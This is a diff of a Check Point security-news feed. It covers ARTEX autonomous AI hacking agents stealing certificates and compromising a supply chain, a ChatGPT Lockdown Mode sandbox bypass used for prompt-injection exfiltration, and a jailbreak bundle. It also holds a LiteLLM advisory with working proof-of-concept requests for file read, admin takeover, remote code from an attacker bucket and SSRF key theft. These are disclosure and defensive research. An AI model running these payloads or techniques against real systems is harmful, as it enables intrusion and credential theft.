-How Did ARTEX Agents Steal Apple Code-Signing Certificates?
-
-One operator tasked ARTEX with attacking gray-market iOS signing services to obtain Apple code-signing certificates that could potentially be resold.
-
-Two ARTEX consoles operated in parallel for roughly two weeks, targeting 10 signing shops. Instead of directing agents through every stage of the attack, the operator primarily asked questions such as “What’s the progress?” and “Which one is closest to the goal?”
-
-The agents independently searched compromised systems for certificate databases and then validated stolen certificates by checking passwords, private keys, Apple revocation status, expiration dates and associated provisioning profiles.
-
-They ultimately obtained more than 300 certificates and their passwords, with three certificates passing the full validation process, meaning they could be used to sign arbitrary iOS applications.
-
-The scale came at a relatively low cost. The operation processed approximately 36 billion tokens, with CPR estimating the AI model costs at $700 to $1,500 based on official DeepSeek API pricing at the time of writing.
-
-Figure 3 – Example gray-market signing certificate service with more than 90,000 subscribers
-
-Can Autonomous Hacking Agents Carry Out Supply Chain Attacks?
-
-A second campaign shows how far an AI agent can progress independently once given a broader financial objective. An operator tasked agents with stealing cryptocurrency from hundreds of targets. During a later attempt to identify and compromise the infrastructure associated with a specific cryptocurrency wallet, an agent discovered an unauthenticated API exposing AWS S3 credentials.
-
-Those credentials provided write access to a bucket containing iOS applications and landing pages for a cryptocurrency service. The agent independently reasoned through the possibility of compromising this distribution infrastructure, executed the write and verified the attack chain.
-
-The original file was later restored, and there was no evidence that the operator ultimately profited from the compromise. However, the activity demonstrates that an agent pursuing one objective can identify and act on a supply chain compromise opportunity without being explicitly instructed to do so.
-
-Where Do Autonomous Hacking Agents Still Fail?
-
-Autonomy does not necessarily translate into successful outcomes. In the cryptocurrency campaign, the agents processed 167.5 million tokens and identified multiple vulnerabilities, including remote code execution and exposed databases. Yet across 292 objectives, 230 findings and 400,791 agent messages, the attacker made no money.
-
-Some agents even incorrectly reported successful cryptocurrency cash-outs because APIs returned a “success” response. The attacker’s wallet showed a $0 balance and no transactions, exposing a significant weakness: agents can successfully execute technical tasks while still misunderstanding whether the intended real-world objective has actually been achieved.
-
-What Does Agentic Hacking Mean for Cybersecurity Teams?
-
-ARTEX shows that agentic hacking is already part of the cyber threat landscape. CPR observed more than 1,600 live publicly accessible ARTEX instances, while the exposed databases provide direct evidence of agents operating with very limited human supervision.
-
-For defenders, the important change is scale and speed. A cybercriminal can task agents with investigating large numbers of targets simultaneously, allowing vulnerabilities across internet-facing systems to be discovered and exploited with considerably less manual effort.
-
-At the same time, the research demonstrates the current limitations of these systems. Agents hallucinate, misunderstand results and may fail to achieve their underlying objective even after successfully compromising systems.
-
-Organizations should therefore expect greater automated pressure against exposed infrastructure. Internet-facing systems should be continuously tested and hardened, with particular attention paid to weak authentication, exposed APIs, credential leakage, remote code execution vulnerabilities and cloud storage permissions.
-
-The ARTEX campaigns provide a glimpse of a threat model that is already taking shape: attackers define the objective, while increasingly autonomous AI agents do much of the work required to pursue it.
-
-For the full technical analysis, read the research from Check Point Research here."
 119c333c39fe,119c333c39fe,2026-11-05 17:22 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Research,Threat Intelligence; AI Security; Vulnerability Management,Article,Hacking on Autopilot: Inside ARTEX Cybercrime Campaigns,https://research.checkpoint.com/2026/hacking-on-autopilot-inside-artex-cybercrime-campaigns/,"” While some agents claimed to have found vulnerabilities that allow USDT cashouts, the attacker’s wallet shows a balance of $0 and no recorded transactions – the findings were...","Key Points
 
 Agentic hacking platforms like ARTEX, where AI models autonomously drive vulnerability discovery and exploitation, have been observed to be used by various cyber criminals.
@@ -1877,85 +2065,6 @@ As AI assistants evolve into full execution environments, running code in the cl
 Guardrails and the built-in security features of AI agents and applications help mitigate threats, but they still offer no absolute guarantee of protection. That is worth remembering before entrusting AI with sensitive information or granting it full access to your computer. Securing these systems requires looking beyond individual features and considering the platform as a whole. The benefits of modern AI assistants are enormous, but adopting them safely demands careful attention to every layer, including the ones users never think about.
 
 The post ChatGPT Lockdown Mode Bypass: Phishing, Malware Delivery, and Silent Data Exfiltration appeared first on Check Point Research."
-dabcdcf064fe,dabcdcf064fe,2026-11-05 13:01 UTC,Vulnerabilities & Patching,Check Point,Check Point Blog,AI Security; Data Security Posture Management; Endpoint Security; Vulnerability Management,Article,ChatGPT Lockdown Mode Bypass Reveals a Wider Challenge in AI Security,https://blog.checkpoint.com/security/chatgpt-lockdown-mode-bypass-reveals-a-wider-challenge-in-ai-security/,"<img width=""800"" height=""400"" src=""https://blog.checkpoint.com/wp-content/uploads/2026/11/ChatGPT-Lockdown-mode-blog-banner-blog_800x400_1.png"" alt="""" data-sanitized-class=""webfeedsFeaturedVisual wp-post-image""><p>Check Point Research (CPR) discovered a vulnerability that bypassed ChatGPT Lockdown M","Check Point Research (CPR) discovered a vulnerability that bypassed ChatGPT Lockdown Mode, a security feature designed to reduce prompt-injection-driven data exfiltration. The flaw could enable silent chat data theft, phishing and malware delivery, including zero-click data exfiltration in the ChatGPT desktop application.
-
-OpenAI fixed the vulnerability following responsible disclosure, but the finding raises a broader enterprise security issue: AI security controls are only as strong as the wider application environment around them.
-
-Key Findings
-
-Check Point Research bypassed ChatGPT Lockdown Mode, a security feature specifically designed to limit prompt-injection-driven data exfiltration.
-
-The vulnerability could enable multiple attack scenarios, including chat data exfiltration, credential phishing and malware delivery through a trusted ChatGPT interface.
-
-The most significant risk demonstrated is the potential for data exfiltration without user interaction, regardless of how ChatGPT is accessed. While CPR used the desktop application in its demonstration, the underlying technique is not limited to the desktop environment.
-
-The vulnerability originated in the wider application environment, demonstrating how weaknesses outside the AI model itself can undermine dedicated AI security controls.
-
-OpenAI fixed the vulnerability following responsible disclosure, and Check Point Research confirmed that the technique described in the research no longer works.
-
-What Is ChatGPT Lockdown Mode?
-
-OpenAI introduced Lockdown Mode as an optional advanced security setting designed to reduce the risk of sensitive information leaving ChatGPT as the result of prompt injection. These attacks attempt to manipulate an AI system through malicious instructions hidden within content it processes, potentially causing the AI or one of its tools to take an unintended action.
-
-One potential outcome is data exfiltration, where sensitive information is sent to an attacker-controlled destination without the user realizing it. Lockdown Mode reduces this risk by restricting several potential outbound channels, including live web access and internet-hosted images, while disabling capabilities such as Deep Research, Agent Mode, live connectors and file downloads.
-
-These safeguards make it considerably harder for malicious instructions to move private information outside ChatGPT. Check Point Research, however, found that another feature within the application created an alternative path around these restrictions.
-
-How Check Point Research Bypassed ChatGPT Lockdown Mode
-
-The vulnerability involved HTML page previews inside ChatGPT code blocks, a feature that allows HTML content to be rendered directly within the ChatGPT experience. Because executing user-controlled HTML and JavaScript can create security risks, this content is placed inside a sandbox designed to separate it from the main ChatGPT application.
-
-The sandbox prevented rendered content from directly accessing information such as ChatGPT cookies, local storage and the main application interface. It also controlled attempts to communicate with external resources and typically required user approval before opening an external URL.
-
-Check Point Research discovered a weakness in the way popup windows were handled within this environment. The HTML preview used nested sandboxed frames, and while ChatGPT intercepted direct attempts to open new windows, the underlying sandbox permissions still allowed popups and permitted them to escape the sandbox.
-
-Researchers found that by creating another nested frame within the rendered page, it was possible to access an unmodified popup function and bypass the restrictions placed on the original HTML preview. Content opened through this route was no longer subject to the same sandbox restrictions, providing a way to circumvent the protections of Lockdown Mode.
-
-The significance extends beyond the individual implementation flaw. Lockdown Mode was specifically intended to reduce the possibility of data leaving a conversation through potentially malicious outbound requests, yet a weakness in another application feature provided an alternative path around that security boundary. This demonstrates how security controls designed for AI can be affected by components elsewhere in the application.
-
-Figure 1 – ChatGPT Lockdown Mode notification displayed when Canvas tries to access an external resource.
-
-Figure 2 – HTML page preview in ChatGPT.
-
-From Data Exfiltration to Phishing and Malware Delivery
-
-Check Point Research found that the vulnerability could be applied to several potential attack scenarios, including data exfiltration, credential theft and malware delivery. An attack could potentially originate from a malicious prompt, malicious GPT or shared chat, depending on the scenario.
-
-Because an attacker could control the content displayed in the popup window, it could also be used to create convincing social-engineering lures within an environment users already trust. In the ChatGPT desktop application, for example, the new window retained the ChatGPT application icon while allowing its title and content to be controlled by the attacker.
-
-Researchers demonstrated how this could be used to present a fake ChatGPT update and encourage the victim to download malware. They also found that the main application window could be manipulated in certain ways, including forcibly signing the user out, creating the possibility of directing a victim to an attacker-controlled authentication page designed to steal credentials.
-
-In the desktop application, downloading a file still required the victim to click a link. The research nevertheless demonstrates how compromising the boundary around a trusted AI interface could make phishing and malware lures more convincing by presenting them within an environment the victim already recognizes.
-
-Why Zero-Click Data Exfiltration Increased the Risk
-
-The most serious scenario identified by Check Point Research involved the Electron-based ChatGPT desktop application, where the popup behavior worked without requiring a user gesture. This removed an important barrier to exploitation because a victim would not necessarily need to click a link or approve an action before the attack could begin.
-
-Researchers demonstrated the scenario using a malicious GPT that could silently leak chat messages to an attacker-controlled server while the victim was having a conversation. In practical terms, this meant that simply interacting with malicious content could potentially be enough to expose information from the conversation.
-
-For organizations, that distinction is particularly important as employees increasingly use AI assistants as part of their everyday workflows. Conversations may include confidential business information, uploaded documents or other sensitive context, increasing the potential impact if an attacker finds a way to cross the boundaries intended to protect that data.
-
-What This Research Means for Enterprise AI Security
-
-The vulnerability demonstrates why AI security needs to extend beyond the model and individual safeguards such as Lockdown Mode. Modern AI platforms combine models with applications, browser and desktop runtimes, sandboxes, code-execution environments and connectors, meaning weaknesses elsewhere in the environment can potentially undermine security controls designed to protect the AI itself.
-
-As AI systems gain greater access to corporate data and applications, organizations should consider several practical measures:
-
-Gain visibility into AI usage: Understand which AI services employees are using and where corporate information is being shared.
-
-Control sensitive data exposure: Establish policies and technical controls around the types of information that employees can share with AI services.
-
-Look beyond model security: Consider the applications, runtimes, connectors and other components surrounding the model as part of the overall AI attack surface.
-
-Reduce the impact of third-party vulnerabilities: Limit the sensitive information available to AI services so that a compromise does not automatically expose everything a user or organization has shared.
-
-This is also where Check Point’s broader AI security approach is relevant. The value in this scenario is not that an enterprise security product would have fixed this specific ChatGPT vulnerability, but that visibility into AI usage and controls over what information can be shared with AI services can help reduce exposure when weaknesses emerge in third-party platforms.
-
-Check Point Research responsibly disclosed the vulnerability to OpenAI, which informed researchers on September 18, 2026, that it had deployed a fix removing the sandbox permissions that enabled the technique. Check Point Research subsequently retested the issue and confirmed that the exploitation method described in the research no longer works.
-
-For enterprises adopting AI at scale, the lesson extends beyond this individual ChatGPT vulnerability. As AI assistants become increasingly capable of executing code, handling files and connecting to external services, security strategies need to account for the wider environment surrounding the model. Greater visibility into AI usage and stronger controls over sensitive corporate information can help organizations adopt these capabilities while reducing the potential impact when vulnerabilities emerge.
-
-For the full technical analysis, read the research from Check Point Research here."
 7d9e2712b17d,7d9e2712b17d,2026-11-03 13:57 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Research,AI Security; Threat Intelligence; Network Security,Article,"Free the Model, Sell the Gateway: Prompt Adware hidden in Jailbreak Bundles",https://research.checkpoint.com/2026/free-the-model-sell-the-gateway-prompt-adware-hidden-in-jailbreak-bundles/,"Free the Model, Sell the Gateway: Prompt Adware hidden in Jailbreak Bundles Check Point Research found a misconfigured webserver of a threat actor operating the Cobalt Strike...","Key Points
 
 Check Point Research analyzed the Haiou jailbreak bundle, a prompt package targeting OpenAI Codex. Such jailbreaks are designed to weaken model guardrails and enable tasks related to hacking, software cracking, and information security.
@@ -3238,321 +3347,3 @@ Researchers have profiled Silent Lynx, a Kazakhstan-linked espionage group targe
 Check Point IPS provides protection against this threat (RARLAB WinRAR Directory Traversal (CVE-2025-8088)
 
 The post 19th October – Threat Intelligence Report appeared first on Check Point Research."
-3d4409520d39,db141295ca02,2026-10-13 14:30 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Research,AI Security; Network Security; Endpoint Security; Vulnerability Management,Article,When LLM Gateways Go Wrong: Findings from LiteLLM,https://research.checkpoint.com/2026/when-llm-gateways-go-wrong-findings-from-litellm/,A separate SSRF vulnerability in the “Clientside LLM Credentials” feature allowed attackers to redirect API calls and exfiltrate provider keys,"TL;DR;
-
-Our security assessment of LiteLLM (v1.77.7), a widely used open-source LLM gateway, uncovered multiple high-impact vulnerabilities (tracked as CVE-2026-35029, CVE-2026-59823) which have been resolved as of LiteLLM version 1.83.9.
-
-The most significant issues stemmed from a missing authorization check on the /config/update endpoint, which allowed any authenticated user (including low-privileged accounts) to modify the proxy’s runtime configuration. This single flaw enabled arbitrary file read, administrative account takeover, and remote code execution via malicious Python modules loaded from cloud storage. A separate SSRF vulnerability in the “Clientside LLM Credentials” feature allowed attackers to redirect API calls and exfiltrate provider keys. These findings highlight that as AI infrastructure tools rapidly evolve, foundational security practices like proper access control and input validation remain essential.
-
-Introduction
-
-As LLM gateways see wider adoption, understanding the security risks they introduce is essential to deploying them safely within an AI stack. These systems sit between applications and model providers and often handle credentials, configuration, and request routing. We decided to take a closer look at LiteLLM, one of the most popular LLM gateways in use today. What started as an exploratory review uncovered multiple high severity vulnerabilities, including credential extraction, access control bypass, and remote code execution. This post presents our findings and highlights the security pitfalls that can arise in LLM gateway deployments and the wider LLM ecosystem.
-
-What are LLM Gateways?
-
-LLM gateways are systems that sit between an application and one or more LLM providers. Instead of calling model APIs directly, applications route requests through a gateway, which then forwards those requests to the appropriate model backend.
-
-In practice, LLM gateways are often used to centralize concerns such as provider abstraction, credential management, request routing, rate limiting, logging, and usage tracking. Many gateways also add higher level features like fallback logic, load balancing across providers, and configuration driven model selection.
-
-LiteLLM
-
-LiteLLM is an open-source project that provides an SDK and a gateway product for working with multiple LLM providers. The project originated through Y Combinator and is widely used across the LLM ecosystem.
-
-In this post, we focus exclusively on the LiteLLM gateway. The gateway is commonly deployed as a standalone service and plays a central role in how LLM requests are handled in many LLM-based applications. Its widespread adoption and position in the request path made it a suitable target for our research.
-
-Our review of LiteLLM was conducted against version 1.77.7. The sections below outline the defects we discovered in the LiteLLM gateway.
-
-Access Control Bypass in /config Endpoint
-
-The LiteLLM proxy exposes an administrative endpoint ‘POST /config/update’, designed to allow runtime modifications to the proxy configuration. This endpoint facilitates updating critical settings, including environment variables, model lists, and general proxy settings.
-
-The Vulnerability
-
-The vulnerability stems from a missing role-based access control (RBAC) check within the endpoint’s implementation, combined with an overly permissive route allowlist for UI sessions.
-
-1. Missing Function-Level Authorization
-
-In secure administrative endpoints within LiteLLM (e.g., /invitation/new), the code explicitly verifies that the authenticated user possesses the PROXY_ADMIN role before proceeding.
-
-Secure Example (/invitation/new in litellm/proxy/proxy_server.py):
-
-@router.post(“/invitation/new”,tags=[“Invite Links”],dependencies=[Depends(user_api_key_auth)],response_model=InvitationModel,include_in_schema=False,)async def new_invitation(data: InvitationNew, user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth)):# …# Explicit Role Checkif user_api_key_dict.user_role != LitellmUserRoles.PROXY_ADMIN:raise HTTPException(status_code=400,detail={“error”: “{}, your role={}”.format(CommonProxyErrors.not_allowed_access.value,user_api_key_dict.user_role,)},)# … business logic …
-
-However, the update_config function relies entirely on the generic user_api_key_auth dependency without performing a subsequent role check on the returned user object.
-
-Vulnerable Code (/config/update in litellm/proxy/proxy_server.py):
-
-@router.post(“/config/update”,dependencies=[Depends(user_api_key_auth)], # Only generic auth checkinclude_in_schema=False,)async def update_config(config_info: ConfigYAML):# …# MISSING: if user_role != PROXY_ADMIN: raise …# …# Proceed to update configurationawait proxy_config.save_config(new_config=config)
-
-2. Route Allowlist Bypass via UI Token Classification
-
-The user_api_key_auth dependency delegates authorization to a common_checks function. This function determines if a request is allowed based on the user’s role and the target route.
-
-Step 2.a: UI Login Creates Token with litellm-dashboard Team
-
-When any user logs into the LiteLLM UI, the backend generates a temporary API key explicitly associated with the special litellm-dashboard team. This occurs in multiple login flows:
-
-# litellm/proxy/proxy_server.py (login flows at lines ~7962, ~8066, ~8203)response = await generate_key_helper_fn(request_type=”key”,**{“user_role”: user_role,“duration”: “24hr”,“key_max_budget”: litellm.max_ui_session_budget,“models”: [],“aliases”: {},“config”: {},“spend”: 0,“user_id”: user_id,“team_id”: “litellm-dashboard”, # <– Key assignment},)
-
-Step 2.b: Token Classification Based on Team ID
-
-During authorization, common_checks classifies tokens as either “ui” or “api” based solely on the team_id field:
-
-# litellm/proxy/auth/auth_checks.py (lines 224-227)token_team = getattr(valid_token, “team_id”, None)token_type: Literal[“ui”, “api”] = (“ui” if token_team is not None and token_team == “litellm-dashboard” else “api”)
-
-Step 2.c: UI Tokens Get Permissive Route Check
-
-If the token is classified as “ui”, the authorization logic routes to _is_ui_route() instead of the stricter _is_api_route_allowed():
-
-# litellm/proxy/auth/auth_checks.py (lines 335-356)def _is_allowed_route(route: str,token_type: Literal[“ui”, “api”],# …) -> bool:if token_type == “ui” and _is_ui_route(route=route, user_obj=user_obj):return True # <– Bypasses stricter API route checkselse:return _is_api_route_allowed(…)
-
-Step 2.d: Prefix Matching Allows /config/update
-
-The ui_routes list includes /config, likely intended to allow reading configuration:
-
-# litellm/proxy/_types.py (lines 490-510)ui_routes = [“/sso”,“/sso/get/ui_settings”,“/login”,“/key/info”,“/config”, # <– Likely intended for read-only config access“/spend”,# …]
-
-The _is_ui_route function uses startswith matching:
-
-# litellm/proxy/auth/auth_checks.py (lines 247-269)def _is_ui_route(route: str, …) -> bool:allowed_routes = LiteLLMRoutes.ui_routes.valueif (route is not Noneand isinstance(route, str)and any(route.startswith(allowed_route) for allowed_route in allowed_routes)):return True # <– /config/update matches startswith(“/config”)
-
-Because /config/update satisfies startswith(“/config”), the check passes. The request is permitted for any user with a valid UI session token, regardless of their actual role (Admin, Internal User, etc.).
-
-Impact
-
-This access control failure allows any authenticated user, including those with the baseline “Internal User” role, to invoke POST /config/update and modify the proxy’s runtime configuration. Through this single exposed endpoint, attackers can achieve:
-
-Arbitrary File Read
-
-Administrative Account Takeover
-
-Remote Code Execution via Pass-Through Endpoints
-
-Each of these exploitation scenarios is detailed in the following sections.
-
-Arbitrary File Read
-
-Impact: Read any file accessible to the LiteLLM process, including configuration files, secrets, and credentials.
-
-The /config/update endpoint accepts an environment_variables field, allowing callers to inject arbitrary key-value pairs into the proxy’s environment. One such variable, UI_LOGO_PATH, controls the file path served by the /get_image endpoint. By setting this variable to a sensitive file path, an attacker can read arbitrary files from the server.
-
-Source: Environment Variable Injection
-
-When /config/update receives environment variables, it encrypts and persists them to the configuration store. This results in the following code being executed, which decrypts these values and writes them directly to os.environ:
-
-# litellm/proxy/proxy_server.py (lines 2841-2860)def _decrypt_and_set_db_env_variables(self, environment_variables: dict) -> dict:“””Decrypts a dictionary of environment variables and then sets them in the environment“””decrypted_env_vars = {}for k, v in environment_variables.items():try:decrypted_value = decrypt_value_helper(value=v, key=k)if decrypted_value is not None:os.environ[k] = decrypted_value # <– Attacker-controlled value set heredecrypted_env_vars[k] = decrypted_valueexcept Exception as e:verbose_proxy_logger.error(“Error setting env variable: %s – %s”, k, str(e))return decrypted_env_vars
-
-Sink: Unvalidated File Path in `/get_image`
-
-The `/get_image` endpoint reads `UI_LOGO_PATH` from the environment and serves the file at that path without any validation:
-
-# litellm/proxy/proxy_server.py (lines 8329-8358)@app.get(“/get_image”, include_in_schema=False)def get_image():“””Get logo to show on admin UI”””current_dir = os.path.dirname(os.path.abspath(__file__))default_logo = os.path.join(current_dir, “logo.jpg”)logo_path = os.getenv(“UI_LOGO_PATH”, default_logo) # <– Attacker-controlledverbose_proxy_logger.debug(“Reading logo from path: %s”, logo_path)if logo_path.startswith((“http://”, “https://”)):# … remote URL handling …else:# Return the local image file if the logo path is not an HTTP/HTTPS URLreturn FileResponse(logo_path, media_type=”image/jpeg”) # <– Arbitrary file read
-
-Proof of Concept
-
-Step 1: Inject `UI_LOGO_PATH ` environment variable
-
-POST /config/update HTTP/1.1Host: localhost:4000Authorization: Bearer sk-[REDACTED-LiteLLM-API-KEY]Content-Type: application/json{“environment_variables”: {“UI_LOGO_PATH”: “/etc/passwd”}}
-
-Step 2: Retrieve file contents
-
-GET /get_image HTTP/1.1Host: localhost:4000
-
-Response:
-
-HTTP/1.1 200 OKcontent-type: image/jpegcontent-length: 812root:x:0:0:root:/root:/bin/ashbin:x:1:1:bin:/bin:/sbin/nologin[…]sshd:x:22:22:sshd:/dev/null:/sbin/nologinnobody:x:65534:65534:nobody:/:/sbin/nologinnonroot:x:65532:65532:Account created by apko:/home/nonroot:/bin/sh
-
-The server returns the contents of /etc/passwd, demonstrating arbitrary file read capability.
-
-Administrative Account Take Over
-
-Impact: a low-privilege user can assume control over the default administrative account for the LiteLLM instance, allowing total control over the gateway and access to any contained provider credentials.
-
-The same environment variable injection primitive can be used to hijack administrative access to the LiteLLM proxy. The UI login flow authenticates users against the UI_USERNAME and UI_PASSWORD environment variables. By overwriting these values, an attacker can set their own credentials and log in as a full Proxy Admin.
-
-Vulnerable Authentication Flow
-
-The `/login` endpoint reads credentials directly from environment variables:
-
-# litellm/proxy/proxy_server.py (lines 7882-7896)form = await request.form()username = str(form.get(“username”))password = str(form.get(“password”))ui_username = os.getenv(“UI_USERNAME”, “admin”) # <– Attacker-controlledui_password = os.getenv(“UI_PASSWORD”, None) # <– Attacker-controlledif ui_password is None:ui_password = str(master_key) if master_key is not None else None
-
-When credentials match, the user is granted full administrative privileges:
-
-# litellm/proxy/proxy_server.py (lines 7922-7927)if secrets.compare_digest(username, ui_username) and secrets.compare_digest(password, ui_password):# Non SSO -> If user is using UI_USERNAME and UI_PASSWORD they are Proxy adminuser_role = LitellmUserRoles.PROXY_ADMINuser_id = litellm_proxy_admin_name
-
-Proof of Concept
-
-Step 1: Inject attacker-controlled credentials
-
-When authenticated via the UI, the user can update the administrator credentials with the following POST request:
-
-POST /config/update HTTP/1.1Host: localhost:4000Authorization: Bearer sk-[REDACTED-LiteLLM-API-KEY]Content-Type: application/json{“environment_variables”: {“UI_USERNAME”: “hacker”,“UI_PASSWORD”: “hacker”}}
-
-Step 2: Log in with the injected credentials
-
-Navigate to the LiteLLM UI login page and authenticate with:
-
-Username: hacker
-
-Password: hacker
-
-The screenshot below shows the full HTTP request/response pair associated with the login request, showing the new username and password being used, and the request being accepted with the server issuing a JWT for the built-in ‘admin’ account.
-
-The next screenshot shows the UI of the dashboard, showing we are indeed logged in as the default admin user.
-
-Remote Code Execution via Pass Through Endpoints
-
-Impact: A low-privilege user can obtain full remote-code execution on the LiteLLM gateway, allowing arbitrary command execution or an interactive reverse shell. Providing full access to all LiteLLM data and a foothold into the network where the LiteLLM gateway is deployed.
-
-LiteLLM supports “pass-through endpoints” that can proxy requests to external services or load custom adapter modules. The /config/update endpoint allows defining pass-through endpoints with a target parameter that supports loading Python modules from remote storage (S3 or GCS). When a target URL starts with s3:// or gcs://, LiteLLM downloads and executes the Python file, leading to remote code execution.
-
-Attack Chain
-
-Step 1: Configuration Update Triggers Endpoint Initialization
-
-When /config/update receives general_settings.pass_through_endpoints, it calls _update_general_settings() which initializes the endpoints:
-
-# litellm/proxy/proxy_server.py (lines 2996-3003)## PASS-THROUGH ENDPOINTS ##if “pass_through_endpoints” in _general_settings:general_settings[“pass_through_endpoints”] = _general_settings[“pass_through_endpoints”]await initialize_pass_through_endpoints(pass_through_endpoints=general_settings[“pass_through_endpoints”])
-
-Step 2: Route Creation Invokes Module Loading
-
-During endpoint initialization, the target is passed to create_pass_through_route(), which attempts to load it as an adapter:
-
-# litellm/proxy/pass_through_endpoints/pass_through_endpoints.py (lines 943-947)try:if isinstance(target, CustomLogger):adapter = targetelse:adapter = get_instance_fn(value=target) # <– Loads remote module
-
-Step 3: Remote Module Download and Execution
-
-When the target starts with `s3://` or `gcs://`, `get_instance_fn()` delegates to `_load_instance_from_remote_storage()`:
-
-# litellm/proxy/types_utils/utils.py (lines 8-14)def get_instance_fn(value: str, config_file_path: Optional[str] = None) -> Any:module_name = valueinstance_name = Nonetry:# Check if value starts with s3:// or gcs://if value.startswith(“s3://”) or value.startswith(“gcs://”):return _load_instance_from_remote_storage(value, config_file_path)
-
-This function downloads the Python file and executes it using importlib:
-
-# litellm/proxy/types_utils/utils.py (lines 153-159)# Load the module from the downloaded file using the actual module namespec = importlib.util.spec_from_file_location(module_path, local_file_path)if spec is None or spec.loader is None:raise ImportError(f”Could not create module spec for {local_file_path}”)module = importlib.util.module_from_spec(spec)spec.loader.exec_module(module) # <– Arbitrary code execution
-
-The call to `exec_module()` executes all top-level code in the downloaded Python file, including import-time side effects.
-
-Proof of Concept
-
-Malicious Adapter (hosted at s3://attacker-bucket /adapters/evil_adapter.py):
-
-import os# Import-time side effect: create a marker directoryos.makedirs(“/tmp/litellm-pwned”, exist_ok=True)class PwnAdapter:def __call__(self, *args, **kwargs):# No-op adapter; existence is enough for get_instance_fnreturn None# Instance name referenced in the ‘target’proxy_handler_instance = PwnAdapter()
-
-Step 1: Register the malicious pass-through endpoint
-
-POST /config/update HTTP/1.1Host: localhost:4000Authorization: Bearer sk-[REDACTED-LiteLLM-API-KEY]Content-Type: application/json{“general_settings”: {“pass_through_endpoints”: [{“id”: “pt-rce-poc”,“path”: “/evil”,“target”: “s3://attacker-bucket /adapters/evil_adapter.proxy_handler_instance”,“include_subpath”: true}]}}
-
-When this request is processed, LiteLLM:
-
-Parses the S3 URL to extract bucket (attacker-bucket) and object key (adapters/evil_adapter.py)
-
-Downloads the Python file to a temporary location
-
-Calls exec_module() which executes the top-level os.makedirs() call
-
-The marker directory /tmp/litellm-pwned is created, confirming code execution
-
-The screenshot below from inside of the Docker container running LiteLLM shows that our arbitrary code was executed and our marker directory was created:
-
-While this proof of concept creates a benign marker directory, an attacker could replace the payload with a reverse shell, credential theft, or any arbitrary code execution.
-
-Server-Side Request Forgery Leading to LLM Provider API key Extraction
-
-Separately from the access control bypass documented above, LiteLLM exposes a documented feature called “Clientside LLM Credentials” that allows any authenticated user to redirect LLM API calls to arbitrary endpoints. This creates a Server-Side Request Forgery (SSRF) vulnerability that can be exploited to steal API credentials or probe internal networks.
-
-Overview
-
-The /chat/completions endpoint (and other LLM endpoints) accepts a user_config parameter in the request body. When present, this parameter causes LiteLLM to create a new router with attacker-controlled settings, including the ability to specify a custom api_base URL.
-
-Vulnerable Code Path
-
-When a request contains `user_config`, the routing logic in `route_llm_request.py` creates a new router with the attacker’s configuration:
-
-# litellm/proxy/route_llm_request.py (lines 122-127)elif “user_config” in data:router_config = data.pop(“user_config”)user_router = litellm.Router(**router_config) # <– Attacker-controlled routerret_val = getattr(user_router, f”{route_type}”)(**data)user_router.discard()return ret_val
-
-No validation is performed on the user_config contents. The attacker can specify a complete model_list with arbitrary api_base values, causing subsequent API calls to be sent to attacker-controlled servers.
-
-Proof of Concept
-
-Attacker’s Server Setup:
-
-Set up a listener on an attacker-controlled server (e.g., 10.10.13.37:9999) to capture incoming requests. In this case, we use a simple netcat listener but any webserver is sufficient.
-
-Malicious Request:
-
-When this request is processed:
-
-LiteLLM creates a new router using the attacker’s model_list
-
-The chat completion request is sent to http://10.10.13.37:9999 instead of the legitimate OpenAI API
-
-The attacker’s server receives the full request, including any configured API keys in the proxy’s default headers
-
-Attacker’s Listener:
-
-Below shows the attacker’s listener that receives the original LLM provider API key which the LiteLLM user should not have access to.
-
-Note: While LiteLLM’s configurable_clientside_auth_params setting restricts direct api_base and api_key parameters in the request body, the user_config parameter follows a different code path that bypasses these restrictions entirely. This allows the documented “Clientside LLM Credentials” feature to be exploited for SSRF without any guardrails.
-
-Miscellaneous Vulnerabilities
-
-During our security assessment, we identified several additional vulnerabilities that, while not directly exploitable for full system compromise, represent significant security weaknesses:
-
-Exposure of Password Hashes
-
-Note: this issue was reported to LiteLLM and acknowledged at the time of reporting – however the issue appears to be a duplicate finding and is being tracked as GHSA-69×8-hrgq-fjj8.
-
-The LiteLLM proxy exposes password hashes through various API endpoints, allowing authenticated users to retrieve hashed credentials for other users. This information disclosure increases the attack surface by providing attackers with material that can be subjected to offline cracking attempts. This information is intended to only be accessible to administrative accounts; however, due to the previously described issue with the UI based tokens, a low privileged user can access the password hashes for other accounts.
-
-Insecure Password Hashing
-
-Note: this issue was reported to LiteLLM and acknowledged at the time of reporting – however the issue appears to be a duplicate finding and is being tracked as GHSA-69×8-hrgq-fjj8.
-
-Password hashes in LiteLLM are generated using a single iteration of a standard hash function without salting, rather than using modern password hashing algorithms like bcrypt, scrypt, or Argon2. This approach provides minimal protection against brute-force attacks and rainbow table lookups:
-
-No Salt: Identical passwords produce identical hashes, enabling rainbow table attacks
-
-Single Hash Iteration: Fast hash computation makes brute-force attacks practical
-
-Weak Algorithm: Standard cryptographic hashes are not designed for password storage
-
-These weaknesses significantly reduce the effort required for an attacker to crack exposed password hashes.
-
-Assigned CVEs
-
-The vulnerabilities documented in this post were disclosed to the LiteLLM maintainers through a coordinated disclosure process.
-
-CVE-2026-35029: Missing Authorization in /config/update endpoint
-
-CVE-2026-59823: Server-Side Request Forgery via user_config parameter
-
-GHSA-69×8-hrgq-fjj8: [duplicate] Exposure of password key material
-
-GHSA-69×8-hrgq-fjj8: [duplicate] Insecure password storage without salting
-
-Conclusions
-
-This security assessment of LiteLLM revealed multiple high-risk vulnerabilities that could be chained together to achieve remote code execution, arbitrary file access, and complete system compromise. The most severe issue, the missing authorization checks in /config/update combined with environment variable injection, demonstrates how a single oversight in access control can cascade into multiple high-impact exploitation paths.
-
-LiteLLM represents an important innovation in the LLM ecosystem, providing a unified interface and management layer for interacting with language models. The rapid development pace in this space has produced powerful tools that solve real problems for organizations deploying AI systems at scale. However, speed of innovation must not come at the expense of fundamental security practices.
-
-The vulnerabilities documented here are not novel attack classes; they include missing authorization checks, path traversal, RCE via dynamic module loading, and insecure password storage. These are well-understood security issues with established mitigation patterns. Their presence in production code highlights a concerning trend: as the AI and LLM ecosystem races forward, traditional security fundamentals are sometimes treated as secondary concerns.
-
-The post When LLM Gateways Go Wrong: Findings from LiteLLM appeared first on Check Point Research."
